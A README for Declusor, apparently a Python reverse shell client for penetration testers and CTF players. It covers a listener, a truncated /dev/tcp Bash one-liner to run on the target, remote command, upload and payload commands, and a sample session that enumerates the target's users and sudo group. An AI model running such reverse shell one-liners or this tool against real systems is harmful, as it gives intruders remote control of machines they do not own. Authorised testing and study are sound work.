# Declusor: A Python-Based Reverse Shell Client

Declusor is an extremely effective and flexible tool written in Python, designed with a modular architecture that allows its components to be easily customized. It's a valuable tool for penetration testers, CTF enthusiasts, and cybersecurity professionals, offering streamlined payload delivery and reliable remote control.

Its command-line interface significantly enhances productivity through intelligent command and file path completion, ensuring reliability and precision in remote operations.

## Features

-   **Reverse Shell Management**: Easily establish and interact with a reverse shell on a target machine.
-   **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
-   **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
-   **File Uploads**: Transfer files from the local machine to the remote target.
-   **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
-   **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.

## Getting Started

### Prerequisites

*   **Python 3.x**: Ensure you have Python 3 installed on your local machine.
*   **Unix-like Operating System**: Declusor relies on some features which are standard on Linux, macOS, and other Unix-like systems.

### Installation

Clone the Declusor repository to your local machine:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor
chmod 700 ./declusor
```

No additional Python packages are strictly required beyond the standard library modules, which are typically available with Python 3.x installations.

## Usage

Declusor operates by having a listener (the Declusor client) waiting for an incoming connection from the target machine. The target machine executes a specific Bash one-liner to establish this reverse shell connection.

### 1. Starting the Listener (Declusor Client)

On your local machine (the machine you are controlling), run the `src/` script, specifying the IP address and port you wish to listen on. This IP address should be reachable from the target machine.

```bash
./declusor <LISTENER_IP> <LISTENER_PORT>
```

**Example:**

```bash
$ ./declusor 127.0.0.1 4444
```

After executing this, the Declusor client will start listening and output the Bash one-liner you need to execute on the target machine.

### 2. Establishing the Reverse Shell (Target Machine)

Once the Declusor client is running and listening, it will display a Bash one-liner in your terminal. You must copy this entire command and execute it on the target machine (the machine you want to control). This command will initiate a persistent reverse shell connection back to your Declusor client.

The one-liner will look similar to this:

```
( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3; exec 3>&-; )
```

### 3. Interacting with the Target

Once the reverse shell is successfully established, your Declusor client will display a `[declusor]` prompt. You can now use the available Declusor commands to interact with the target machine.

```
[declusor] help
load    : Load a payload from a file and send it to the remote system.
command : Execute a command on the remote system.
shell   : Open an interactive shell session with the target device.
upload  : Uploads a file to the target machine.
execute : Execute a file on the remote system.
help    : Display help information about available commands.
exit    : Exit the program.
```

## Example of Workflow

On your local machine (attacker):

```
$ ./declusor 127.0.0.1 4444
( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3; exec 3>&-; )
```

Copy the entire line and paste it into the target machine's terminal. Once executed on the target, your Declusor client will show the prompt:

```
[declusor] command whoami
ubuntu
[declusor] command 'ls -l /home'
total 4.0K
drwxr-x--- 16 ubuntu ubuntu 4.0K Sep 22 00:38 ubuntu
[declusor] shell
pwd
/home/ubuntu
[declusor] upload '/home/ubuntu/foo.txt'
/tmp/dd874fdc8e6987d565f268210358064fd8e67dcbfcbc4187acab6d7fe527c0d1.temp
[declusor] command 'cat /tmp/dd874fdc8e6987d565f268210358064fd8e67dcbfcbc4187acab6d7fe527c0d1.temp'
Bar
[declusor] load 
info/    search/  
[declusor] load info/users.sh

CURRENT USER/GROUP
------------------
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)

USERS LOGGED IN
---------------
ubuntu   pts/1    -                 8:19m -bash

CURRENT USERS
-------------
uid=0(root)                gid=0(root)                groups=0(root)
uid=1(daemon)              gid=1(daemon)              groups=1(daemon)
uid=2(bin)                 gid=2(bin)                 groups=2(bin)
uid=3(sys)                 gid=3(sys)                 groups=3(sys)
uid=4(sync)                gid=65534(nogroup)         groups=65534(nogroup)
uid=5(games)               gid=60(games)              groups=60(games)
uid=6(man)                 gid=12(man)                groups=12(man)
uid=7(lp)                  gid=7(lp)                  groups=7(lp)
uid=8(mail)                gid=8(mail)                groups=8(mail)
uid=9(news)                gid=9(news)                groups=9(news)
uid=10(uucp)               gid=10(uucp)               groups=10(uucp)
uid=13(proxy)              gid=13(proxy)              groups=13(proxy)
uid=33(www-data)           gid=33(www-data)           groups=33(www-data)
uid=34(backup)             gid=34(backup)             groups=34(backup)
uid=38(list)               gid=38(list)               groups=38(list)
uid=39(irc)                gid=39(irc)                groups=39(irc)
uid=42(_apt)               gid=65534(nogroup)         groups=65534(nogroup)
uid=65534(nobody)          gid=65534(nogroup)         groups=65534(nogroup)
uid=998(systemd-network)   gid=998(systemd-network)   groups=998(systemd-network)
uid=996(systemd-timesync)  gid=996(systemd-timesync)  groups=996(systemd-timesync)
uid=100(dhcpcd)            gid=65534(nogroup)         groups=65534(nogroup)
uid=101(messagebus)        gid=101(messagebus)        groups=101(messagebus)
uid=102(syslog)            gid=102(syslog)            groups=102(syslog),4(adm)
uid=991(systemd-resolve)   gid=991(systemd-resolve)   groups=991(systemd-resolve)
uid=103(uuidd)             gid=103(uuidd)             groups=103(uuidd)
uid=104(landscape)         gid=105(landscape)         groups=105(landscape)
uid=990(polkitd)           gid=990(polkitd)           groups=990(polkitd)
uid=1000(ubuntu)           gid=1000(ubuntu)           groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)

SUPER USERS
-----------
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)
[declusor] exit
```

## Contributing

Contributions to Declusor are highly encouraged! If you find bugs, have suggestions for new features, or want to improve the existing codebase, please feel free to open issues or submit pull requests on the GitHub repository.
